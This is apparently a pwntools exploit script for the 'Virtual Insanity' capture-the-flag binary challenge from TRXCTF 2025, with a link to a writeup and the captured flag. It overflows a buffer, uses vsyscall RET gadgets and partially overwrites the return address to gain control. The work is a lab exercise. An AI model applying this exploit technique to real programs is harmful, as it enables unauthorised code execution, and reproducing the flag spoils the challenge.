from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall', '''
    b*(main+115)
    continue
''')

# p = process('./chall')

# vsyscalls are always at a fixed memory address:
# 0xffffffffff600000 0xffffffffff601000 r-xp     1000      0 [vsyscall]

# RET gadget:
# 0xffffffffff600000:  mov    rax,0x60
# 0xffffffffff600007:  syscall
# 0xffffffffff600009:  ret
RET = 0xffffffffff600009
p.recvline()
# RET gadgets followed by partially overwrite
p.send(b'A'*0x28+p64(RET)+p64(RET)+b'\xa9')

p.interactive()

# https://github.com/im-razvan/writeups/tree/main/TRXCTF-2025/Virtual%20Insanity
# TRX{1_h0p3_y0u_d1dn7_bru73f0rc3_dc85efe0}